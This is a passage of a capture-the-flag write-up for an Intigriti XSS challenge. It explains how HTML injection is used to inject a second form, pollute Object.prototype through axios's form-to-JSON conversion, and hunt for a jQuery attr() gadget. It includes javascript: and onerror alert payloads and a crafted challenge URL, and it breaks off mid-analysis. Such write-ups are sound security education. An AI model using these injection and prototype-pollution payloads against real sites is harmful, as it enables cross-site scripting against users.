            <span class="nf">search</span><span class="p">();</span>
        <span class="p">});</span>
    <span class="p">};</span>
</code></pre></div></div>

<p>Upon window load, it calls the <code class="language-plaintext highlighter-rouge">search</code> method, <code class="language-plaintext highlighter-rouge">params</code> variable contains the value of <em>search</em> query parameter.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="nx">axios</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/search</span><span class="dl">"</span><span class="p">,</span> <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#search</span><span class="dl">"</span><span class="p">).</span><span class="nf">get</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="p">{</span>
            <span class="dl">"</span><span class="s2">headers</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/json</span><span class="dl">"</span> <span class="p">}</span>
        <span class="p">}).</span><span class="nf">then</span><span class="p">((</span><span class="nx">d</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">img.loading</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">(</span><span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
            <span class="kd">const</span> <span class="nx">repo</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">data</span><span class="p">;</span>
            <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">repo</span><span class="p">.</span><span class="nx">owner</span><span class="p">)</span> <span class="p">{</span>
                <span class="nf">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Not found!</span><span class="dl">"</span><span class="p">);</span>
                <span class="k">return</span><span class="p">;</span>
            <span class="p">};</span>

            <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">img.avatar</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">(</span><span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">,</span> <span class="nx">repo</span><span class="p">.</span><span class="nx">owner</span><span class="p">.</span><span class="nx">avatar_url</span><span class="p">);</span>
            <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#description</span><span class="dl">"</span><span class="p">).</span><span class="nf">text</span><span class="p">(</span><span class="nx">repo</span><span class="p">.</span><span class="nx">description</span><span class="p">);</span>
            <span class="k">if </span><span class="p">(</span><span class="nx">repo</span><span class="p">.</span><span class="nx">homepage</span> <span class="o">&amp;&amp;</span> <span class="nx">repo</span><span class="p">.</span><span class="nx">homepage</span><span class="p">.</span><span class="nf">startsWith</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://</span><span class="dl">"</span><span class="p">))</span> <span class="p">{</span>
                <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#homepage</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">({</span>
                    <span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">:</span> <span class="nx">repo</span><span class="p">.</span><span class="nx">homepage</span><span class="p">,</span>
                    <span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">:</span> <span class="kc">false</span>
                <span class="p">});</span>
            <span class="p">};</span>
        <span class="p">});</span>
</code></pre></div></div>

<p>Axios is used to make a post request to the search endpoint, the 2nd arguement is <code class="language-plaintext highlighter-rouge">$("#search").get(0)</code> which for some reasons looks weird.
It stores the response from the search endpoint in <code class="language-plaintext highlighter-rouge">repo</code> variable, if <code class="language-plaintext highlighter-rouge">repo.owner</code> is defined it moves on the next part of code</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">img.avatar</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">(</span><span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">,</span> <span class="nx">repo</span><span class="p">.</span><span class="nx">owner</span><span class="p">.</span><span class="nx">avatar_url</span><span class="p">);</span>

<span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">img.avatar</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="nx">corresponds</span> <span class="nx">to</span> <span class="nx">the</span> <span class="o">&lt;</span><span class="nx">img</span> <span class="kd">class</span><span class="o">=</span><span class="dl">"</span><span class="s2">avatar</span><span class="dl">"</span> <span class="nx">width</span><span class="o">=</span><span class="dl">"</span><span class="s2">35%</span><span class="dl">"</span><span class="o">&gt;</span> <span class="nx">element</span>
<span class="nx">It</span> <span class="nx">sets</span> <span class="nx">the</span> <span class="nx">src</span> <span class="nx">attribute</span> <span class="nx">value</span> <span class="kd">with</span> <span class="nx">what</span> <span class="nx">is</span> <span class="k">in</span> <span class="nx">the</span> <span class="s2">`repo.owner.avatar_url`</span> <span class="nx">property</span>
</code></pre></div></div>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#description</span><span class="dl">"</span><span class="p">).</span><span class="nf">text</span><span class="p">(</span><span class="nx">repo</span><span class="p">.</span><span class="nx">description</span><span class="p">);</span>

<span class="o">&lt;</span><span class="nx">p</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">description</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/p&gt; /</span><span class="o">/</span> <span class="nx">sets</span> <span class="nx">the</span> <span class="nx">innerText</span> <span class="nx">property</span> <span class="nx">to</span> <span class="s2">`repo.description`</span>
</code></pre></div></div>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>            <span class="k">if </span><span class="p">(</span><span class="nx">repo</span><span class="p">.</span><span class="nx">homepage</span> <span class="o">&amp;&amp;</span> <span class="nx">repo</span><span class="p">.</span><span class="nx">homepage</span><span class="p">.</span><span class="nf">startsWith</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://</span><span class="dl">"</span><span class="p">))</span> <span class="p">{</span>
                <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#homepage</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">({</span>
                    <span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">:</span> <span class="nx">repo</span><span class="p">.</span><span class="nx">homepage</span><span class="p">,</span>
                    <span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">:</span> <span class="kc">false</span>
                <span class="p">});</span>
            <span class="p">};</span>
</code></pre></div></div>

<p>It checks the value of <code class="language-plaintext highlighter-rouge">repo.homepage</code> if it starts <code class="language-plaintext highlighter-rouge">https://</code> or not. If it does it sets the value to the src attribute of <code class="language-plaintext highlighter-rouge">$("#homepage")</code> element which basically is an iframe</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">id=</span><span class="s">"homepage"</span> <span class="na">hidden=</span><span class="s">""</span><span class="nt">&gt;&lt;/iframe&gt;</span>
</code></pre></div></div>

<p>This kinda looks promising sink  as if somehow that check can be bypassed (with the help of quirk of this challenge) it would be easy to get xss if it went something like this</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">id=</span><span class="s">"homepage"</span> <span class="na">hidden=</span><span class="s">""</span> <span class="na">src=</span><span class="s">"javascript:alert()"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
</code></pre></div></div>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">app</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/search</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nx">name</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">q</span><span class="p">;</span>
    <span class="nx">repo</span> <span class="o">=</span> <span class="p">{};</span>

    <span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">item</span> <span class="k">of</span> <span class="nx">repos</span><span class="p">.</span><span class="nx">items</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">item</span><span class="p">.</span><span class="nx">full_name</span> <span class="o">&amp;&amp;</span> <span class="nx">item</span><span class="p">.</span><span class="nx">full_name</span><span class="p">.</span><span class="nf">includes</span><span class="p">(</span><span class="nx">name</span><span class="p">))</span> <span class="p">{</span>
            <span class="nx">repo</span> <span class="o">=</span> <span class="nx">item</span>
	    <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">(</span><span class="nx">repo</span><span class="p">);</span>
<span class="p">});</span>
</code></pre></div></div>

<p>It basically searchs for the string provided in q param (search parameter ) and checks if a match is found in repos.json file (check the source)</p>

<p>For eg this loads:
https://challenge-0124.intigriti.io/challenge?name=shirley%3Cimg%20src=x%3E&amp;search=angular/material-start</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">id=</span><span class="s">"homepage"</span> <span class="na">src=</span><span class="s">"https://angularjs-material-start.web.app"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
</code></pre></div></div>

<hr />

<h1 id="axios-prototype-pollution">Axios Prototype Pollution</h1>

<p>As I already said that the 2nd arg kinda look weird.Lets dig into it to see why it‚Äôs used that way</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">axios</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/search</span><span class="dl">"</span><span class="p">,</span> <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#search</span><span class="dl">"</span><span class="p">).</span><span class="nf">get</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="p">{</span>
            <span class="dl">"</span><span class="s2">headers</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/json</span><span class="dl">"</span> <span class="p">}</span>
        <span class="p">})</span>
</code></pre></div></div>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span><span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#search</span><span class="dl">"</span><span class="p">).</span><span class="nf">get</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="o">&lt;</span><span class="nx">form</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">search</span><span class="dl">"</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">q</span><span class="dl">"</span> <span class="nx">value</span><span class="o">=</span><span class="dl">"</span><span class="s2">angular/material-start</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="sr">/form</span><span class="err">&gt;
</span></code></pre></div></div>

<p>Ok so they are passing full the whole form tag as 2nd arg?</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /search HTTP/1.1
Host: challenge-0124.intigriti.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Content-Type: application/json
Content-Length: 30

{"q":"angular/material-start"}
</code></pre></div></div>

<p>Cool, so it somehow converted that form tag to  json format.
Looking at some examples of axios post calls</p>

<p>https://github.com/axios/axios/blob/6d4c421ee157d93b47f3f9082a7044b1da221461/test/module/typings/cjs/index.ts#L91</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">axios</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/user</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">foo</span><span class="p">:</span> <span class="dl">'</span><span class="s1">bar</span><span class="dl">'</span> <span class="p">})</span>
    <span class="p">.</span><span class="nf">then</span><span class="p">(</span><span class="nx">handleResponse</span><span class="p">)</span>
    <span class="p">.</span><span class="k">catch</span><span class="p">(</span><span class="nx">handleError</span><span class="p">);</span>
</code></pre></div></div>

<p>See the 2nd arg is actually in json format.
So a form tag was converted into  a json object, such conversions to json objects are often vulnerable to prototype pollution so I started searching on google for ‚Äúaxios prototype pollution‚Äù</p>

<p>The first seacrh result:</p>

<p>https://security.snyk.io/vuln/SNYK-JS-AXIOS-6144788</p>

<p>Commit: https://github.com/axios/axios/commit/3c0c11cade045c4412c242b5727308cff9897a0e</p>

<p>Indeed this is a fix for the pp bug, before there was no check for the key if it was equal to <code class="language-plaintext highlighter-rouge">__proto__</code>:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">formDataToJSON</span><span class="p">(</span><span class="nx">formData</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">function</span> <span class="nf">buildPath</span><span class="p">(</span><span class="nx">path</span><span class="p">,</span> <span class="nx">value</span><span class="p">,</span> <span class="nx">target</span><span class="p">,</span> <span class="nx">index</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">name</span> <span class="o">=</span> <span class="nx">path</span><span class="p">[</span><span class="nx">index</span><span class="o">++</span><span class="p">];</span>

    <span class="k">if </span><span class="p">(</span><span class="nx">name</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">__proto__</span><span class="dl">'</span><span class="p">)</span> <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</code></pre></div></div>
<p>One more file was changed in that commit which is used to check for regressions:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nf">it</span><span class="p">(</span><span class="dl">'</span><span class="s1">should resist prototype pollution CVE</span><span class="dl">'</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">formData</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">FormData</span><span class="p">();</span>

    <span class="nx">formData</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="dl">'</span><span class="s1">foo[0]</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">1</span><span class="dl">'</span><span class="p">);</span>
    <span class="nx">formData</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="dl">'</span><span class="s1">foo[1]</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">2</span><span class="dl">'</span><span class="p">);</span>
    <span class="nx">formData</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="dl">'</span><span class="s1">__proto__.x</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">hack</span><span class="dl">'</span><span class="p">);</span>
    <span class="nx">formData</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="dl">'</span><span class="s1">constructor.prototype.y</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">value</span><span class="dl">'</span><span class="p">);</span>

    <span class="nf">expect</span><span class="p">(</span><span class="nf">formDataToJSON</span><span class="p">(</span><span class="nx">formData</span><span class="p">)).</span><span class="nf">toEqual</span><span class="p">({</span>
      <span class="na">foo</span><span class="p">:</span> <span class="p">[</span><span class="dl">'</span><span class="s1">1</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">2</span><span class="dl">'</span><span class="p">],</span>
      <span class="na">constructor</span><span class="p">:</span> <span class="p">{</span>
        <span class="na">prototype</span><span class="p">:</span> <span class="p">{</span>
          <span class="na">y</span><span class="p">:</span> <span class="dl">'</span><span class="s1">value</span><span class="dl">'</span>
        <span class="p">}</span>
      <span class="p">}</span>
    <span class="p">});</span>

    <span class="nf">expect</span><span class="p">({}.</span><span class="nx">x</span><span class="p">).</span><span class="nf">toEqual</span><span class="p">(</span><span class="kc">undefined</span><span class="p">);</span>
    <span class="nf">expect</span><span class="p">({}.</span><span class="nx">y</span><span class="p">).</span><span class="nf">toEqual</span><span class="p">(</span><span class="kc">undefined</span><span class="p">);</span>
  <span class="p">});</span>
<span class="p">});</span>
</code></pre></div></div>

<p>This gives us an idea about how the payload will look like to trigger the prototype pollution bug:</p>

<p>Sample prototype pollution payload:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">form</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">search</span><span class="dl">"</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">q</span><span class="dl">"</span> <span class="nx">value</span><span class="o">=</span><span class="dl">"</span><span class="s2">angular/material-start</span><span class="dl">"</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">__proto__.x</span><span class="dl">"</span> <span class="nx">value</span><span class="o">=</span><span class="dl">"</span><span class="s2">hack</span><span class="dl">"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="sr">/form</span><span class="err">&gt;
</span></code></pre></div></div>

<p>Our html injection is before the form tag, so we can supply the above prototype pollution payload</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;h2&gt;</span>Hey <span class="nt">&lt;</span><span class="err">%</span><span class="na">-</span> <span class="na">name</span> <span class="err">%</span><span class="nt">&gt;</span>,<span class="nt">&lt;br&gt;</span>Which repo are you looking for?<span class="nt">&lt;/h2&gt;</span>

<span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"search"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"q"</span> <span class="na">value=</span><span class="s">"&lt;%= search %&gt;"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span>
</code></pre></div></div>
<p>https://challenge-0124.intigriti.io/challenge?name=shirley%3Cform%20id=%22search%22%3E%20%3Cinput%20name=%22q%22%20value=%22angular/material-start%22%3E%20%3Cinput%20name=%22<strong>proto</strong>.x%22%20value=%22hack%22/%3E%20%3C/form%3E&amp;search=angular/material-start</p>

<p>It will render like this</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;h2&gt;</span>Hey shirley<span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"search"</span><span class="nt">&gt;</span> <span class="nt">&lt;input</span> <span class="na">value=</span><span class="s">"angular/material-start"</span> <span class="na">name=</span><span class="s">"q"</span><span class="nt">&gt;</span> <span class="nt">&lt;input</span> <span class="na">value=</span><span class="s">"hack"</span> <span class="na">name=</span><span class="s">"__proto__.x"</span><span class="nt">&gt;</span> <span class="nt">&lt;/form&gt;</span>,<span class="nt">&lt;br&gt;</span>Which repo are you looking for?<span class="nt">&lt;/h2&gt;</span>

<span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"search"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"q"</span> <span class="na">value=</span><span class="s">"angular/material-start"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span>
</code></pre></div></div>

<p>See now there are two form tags with same id <code class="language-plaintext highlighter-rouge">search</code>, one is the original  and the other which we injected contains the pp payload
As our injected form tag is first it will be used by axios instead</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">axios</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/search</span><span class="dl">"</span><span class="p">,</span> <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#search</span><span class="dl">"</span><span class="p">).</span><span class="nf">get</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="p">{</span>
            <span class="dl">"</span><span class="s2">headers</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/json</span><span class="dl">"</span> <span class="p">}</span>
        <span class="p">})</span>
</code></pre></div></div>

<p>Here we go , we successfully polluted the <code class="language-plaintext highlighter-rouge">x</code> property.</p>

<p><img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/a8608493-c73b-428b-91a9-f4d7828c07b8" alt="image" /></p>

<hr />

<h1 id="prototype-pollution-gadget">Prototype Pollution Gadget</h1>

<p>As I had no idea about how to get xss for now, I though why not try looking for a pp gadget in axios or jquery.As that can give easy xss.
Here you can find a bunch of gadgets for jquery: https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/jquery.md#xoff-jquery-all-versions</p>

<p>For axios I didn‚Äôt find anything from google search and the jquery ones didn‚Äôt seemed related to the challenge.</p>

<p>So the only possible way was to look for a new jquery gadget :)</p>

<p>To make the process easiere I was using a local version which had the jquery unminified version</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script</span><span class="err">/</span><span class="na">src=</span><span class="s">https://code.jquery.com/jquery-3.7.1.js</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;script&gt;</span>
  
  <span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">test</span><span class="o">=</span><span class="dl">"</span><span class="s2">&lt;img src=x onerror=alert()&gt;</span><span class="dl">"</span>

<span class="nt">&lt;/script&gt;</span>

<span class="nt">&lt;iframe</span> <span class="na">id=</span><span class="s">"homepage"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
<span class="nt">&lt;img</span> <span class="na">class=</span><span class="s">"avatar"</span> <span class="na">width=</span><span class="s">"35%"</span> <span class="na">src=</span><span class="s">"https://avatars.githubusercontent.com/u/52466165?v=4"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;p</span> <span class="na">id=</span><span class="s">"description"</span><span class="nt">&gt;</span>A tool to calculate the contrast ratio between any two valid CSS colors.<span class="nt">&lt;/p&gt;</span>


<span class="nt">&lt;script&gt;</span>
<span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#description</span><span class="dl">"</span><span class="p">).</span><span class="nf">text</span><span class="p">(</span><span class="dl">"</span><span class="s2">hello</span><span class="dl">"</span><span class="p">);</span>
       <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#homepage</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">({</span>
                    <span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">:</span> <span class="dl">""</span><span class="p">,</span>
                    <span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">:</span> <span class="kc">false</span>
                <span class="p">});</span>
<span class="nt">&lt;/script&gt;</span>


</code></pre></div></div>

<p>One thing was starnge after using a pp payload, this error appeared in the console:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Uncaught</span> <span class="nx">TypeError</span><span class="p">:</span> <span class="nx">Cannot</span> <span class="nx">use</span> <span class="dl">'</span><span class="s1">in</span><span class="dl">'</span> <span class="nx">operator</span> <span class="nx">to</span> <span class="nx">search</span> <span class="k">for</span> <span class="dl">'</span><span class="s1">set</span><span class="dl">'</span> <span class="k">in</span> <span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="nx">x</span> <span class="nx">onerror</span><span class="o">=</span><span class="nf">alert</span><span class="p">()</span><span class="o">&gt;</span>
    <span class="nx">at</span> <span class="nf">attr </span><span class="p">(</span><span class="nx">jquery</span><span class="o">-</span><span class="mf">3.7</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="nx">js</span><span class="p">:</span><span class="mi">7910</span><span class="p">:</span><span class="mi">24</span><span class="p">)</span>
    <span class="nx">at</span> <span class="nf">access </span><span class="p">(</span><span class="nx">jquery</span><span class="o">-</span><span class="mf">3.7</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="nx">js</span><span class="p">:</span><span class="mi">3919</span><span class="p">:</span><span class="mi">5</span><span class="p">)</span>
    <span class="nx">at</span> <span class="nf">access </span><span class="p">(</span><span class="nx">jquery</span><span class="o">-</span><span class="mf">3.7</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="nx">js</span><span class="p">:</span><span class="mi">3890</span><span class="p">:</span><span class="mi">4</span><span class="p">)</span>
    <span class="nx">at</span> <span class="nx">jQuery</span><span class="p">.</span><span class="nx">fn</span><span class="p">.</span><span class="nx">init</span><span class="p">.</span><span class="nf">attr </span><span class="p">(</span><span class="nx">jquery</span><span class="o">-</span><span class="mf">3.7</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="nx">js</span><span class="p">:</span><span class="mi">7872</span><span class="p">:</span><span class="mi">10</span><span class="p">)</span>
    <span class="nx">at</span> <span class="nx">tset2</span><span class="p">.</span><span class="nx">htm</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mi">23</span>
</code></pre></div></div>

<p>The statement <code class="language-plaintext highlighter-rouge">"set" in hooks</code> was triggering this error, as set property is there only in case of objects but turns out hooks was containing a string.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>			<span class="k">if </span><span class="p">(</span> <span class="nx">hooks</span> <span class="o">&amp;&amp;</span> <span class="dl">"</span><span class="s2">set</span><span class="dl">"</span> <span class="k">in</span> <span class="nx">hooks</span> <span class="o">&amp;&amp;</span>
				<span class="p">(</span> <span class="nx">ret</span> <span class="o">=</span> <span class="nx">hooks</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span> <span class="nx">elem</span><span class="p">,</span> <span class="nx">value</span><span class="p">,</span> <span class="nx">name</span> <span class="p">)</span> <span class="p">)</span> <span class="o">!==</span> <span class="kc">undefined</span> <span class="p">)</span> <span class="p">{</span>
				<span class="k">return</span> <span class="nx">ret</span><span class="p">;</span>
			<span class="p">}</span>
</code></pre></div></div>

<p>Tracing it back from where hooks came from</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="k">if </span><span class="p">(</span> <span class="nx">nType</span> <span class="o">!==</span> <span class="mi">1</span> <span class="o">||</span> <span class="o">!</span><span class="nx">jQuery</span><span class="p">.</span><span class="nf">isXMLDoc</span><span class="p">(</span> <span class="nx">elem</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
            <span class="nx">hooks</span> <span class="o">=</span> <span class="nx">jQuery</span><span class="p">.</span><span class="nx">attrHooks</span><span class="p">[</span> <span class="nx">name</span><span class="p">.</span><span class="nf">toLowerCase</span><span class="p">()</span> <span class="p">]</span> <span class="o">||</span>
                <span class="p">(</span> <span class="nx">jQuery</span><span class="p">.</span><span class="nx">expr</span><span class="p">.</span><span class="nx">match</span><span class="p">.</span><span class="nx">bool</span><span class="p">.</span><span class="nf">test</span><span class="p">(</span> <span class="nx">name</span> <span class="p">)</span> <span class="p">?</span> <span class="nx">boolHook</span> <span class="p">:</span> <span class="kc">undefined</span> <span class="p">);</span>
        <span class="p">}</span>
</code></pre></div></div>

<p>somehow <code class="language-plaintext highlighter-rouge">name</code> contains the polluted property for eg in this case <code class="language-plaintext highlighter-rouge">test</code></p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">test</span><span class="o">=</span><span class="dl">"</span><span class="s2">&lt;img src=x onerror=alert()&gt;</span><span class="dl">"</span>
</code></pre></div></div>

<p>Normally it would return undefined but due to the prototype pollution</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">jQuery</span><span class="p">.</span><span class="nx">attrHooks</span><span class="p">[</span> <span class="nx">name</span><span class="p">.</span><span class="nf">toLowerCase</span><span class="p">()</span> <span class="p">]</span>
<span class="nx">jQuery</span><span class="p">.</span><span class="nx">attrHooks</span><span class="p">[</span> <span class="dl">"</span><span class="s2">test</span><span class="dl">"</span><span class="p">.</span><span class="nf">toLowercase</span><span class="p">()</span> <span class="p">]</span> <span class="nx">was</span> <span class="nx">returning</span> <span class="nx">a</span> <span class="nx">string</span> <span class="dl">"</span><span class="s2">&lt;img src=x onerror=alert()&gt;</span><span class="dl">"</span>
</code></pre></div></div>

<p>Tracing more backwards to see where name is coming from</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">jQuery</span><span class="p">.</span><span class="nf">extend</span><span class="p">(</span> <span class="p">{</span>
    <span class="na">attr</span><span class="p">:</span> <span class="kd">function</span><span class="p">(</span> <span class="nx">elem</span><span class="p">,</span> <span class="nx">name</span><span class="p">,</span> <span class="nx">value</span> <span class="p">)</span> <span class="p">{</span>
</code></pre></div></div>
<p>name -&gt; test</p>

<p>value -&gt; <code class="language-plaintext highlighter-rouge">&lt;img src=x onerror=alert()&gt;</code></p>

<p>Tracing from where this function was called:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if </span><span class="p">(</span> <span class="nx">fn</span> <span class="p">)</span> <span class="p">{</span>
